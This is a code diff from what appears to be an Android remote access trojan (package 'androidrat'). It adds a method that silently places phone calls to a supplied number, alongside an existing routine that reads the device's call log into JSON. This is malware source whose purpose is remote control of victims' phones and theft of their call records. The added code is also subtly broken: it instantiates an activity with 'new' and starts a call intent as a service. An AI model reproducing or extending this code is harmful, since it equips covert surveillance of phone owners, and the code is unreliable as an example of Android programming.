@@ -1,5 +1,6 @@
 package com.ot.androidrat;
 
+import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.util.Log;
@@ -8,7 +9,13 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-public class CallLog {
+public class Voice {
+
+    public void phoneCall(String phoneNo){
+        Intent callIntent = new Intent(Intent.ACTION_CALL);
+        callIntent.setData(Uri.parse("tel:" + phoneNo));
+        new MainActivity().startService(callIntent);
+    }
 
     public void viewCallLog(){
         try {
@@ -39,5 +46,6 @@ public class CallLog {
             e.printStackTrace();
         }
     }
+
 
 }
